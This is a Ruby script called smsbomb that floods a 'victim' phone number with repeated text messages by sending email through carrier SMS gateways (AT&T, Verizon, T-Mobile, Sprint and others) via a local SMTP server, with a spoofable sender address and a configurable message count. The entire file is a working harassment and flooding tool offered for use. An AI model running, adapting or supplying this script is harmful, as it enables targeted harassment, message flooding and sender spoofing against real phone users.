#!/usr/bin/ruby

#########################################################
# 			s.rb 				#
# 	written by David Shaw <dshaw@dshaw.net 		#
# 	contributions by MasterChen <chen@greynoi.se>	#
#########################################################

require 'net/smtp'

# Initialization
$victim = ""
$carrier = ""
$from = "admin@the.inter.net"
$content = ""
$count = 3

# Gather inputs from commandline
ARGV.each_with_index do |arg, i|
	if arg.downcase == "-victim" and ARGV.size > i+1 then
		$victim = ARGV[i+1]
	elsif arg.downcase == "-carrier" and ARGV.size > i+1 then
		if ARGV[i+1].downcase == "att" then $victim = $victim + "@txt.att.net"
		elsif ARGV[i+1].downcase == "alltel" then $victim = $victim + "@message.Alltel.com"
		elsif ARGV[i+1].downcase == "verizon" then $victim = $victim + "@vzwpix.com"
		elsif ARGV[i+1].downcase == "t-mobile" then $victim = $victim + "@tmomail.net"
		elsif ARGV[i+1].downcase == "sprint" then $victim = $victim + "@pm.sprint.com"
		elsif ARGV[i+1].downcase == "boost" then $victim = $victim + "@myboostmobile.com"
		elsif ARGV[i+1].downcase == "cricket" then $victim = $victim + "@sms.mycricket.com"
		elsif ARGV[i+1].downcase == "goofi" then $victim = $victim + "@msg.fi.google.com" # added and tested by MasterChen
		end
		
	elsif arg.downcase == "-from" and ARGV.size > i+1 then
		$from = ARGV[i+1]
	elsif arg.downcase == "-count" and ARGV.size > i+1 then
		$count = ARGV[i+1]
	elsif arg.downcase == "-text" and ARGV.size > i+1 then
		temp = 1
		while (i + temp) < ARGV.size do	
			$content = $content + " " + ARGV[i+temp]
			temp = temp + 1
		end
	end
	
end

# Error handling
if $victim == "" or $content == "" then
	puts "[+] sorry, there was an error in your syntax. please try again."
	puts
	puts "smsbomb usage:"
	puts "ruby smsbomb.rb -victim 1234567890 -carrier att|t-mobile|verizon|alltel|sprint|boost|cricket|goofi -from evil-address@valid-domain.com"
	puts "-count 5 (number of texts to send) -text your message here      *** note: -text <message> needs to be the last flag!"
	Kernel.exit
end


puts "[+] sending #{$count} messages to #{$victim} from #{$from}"

msg = "
From: #{$from}
To: #{$victim}  
Subject:
#{$content}
                                                 
"

Integer($count).times do

	Net::SMTP.start('localhost', 25) do |smtp|	
		smtp.send_message msg, "#{$from}", $victim
		smtp.finish
	end


sleep 1

end
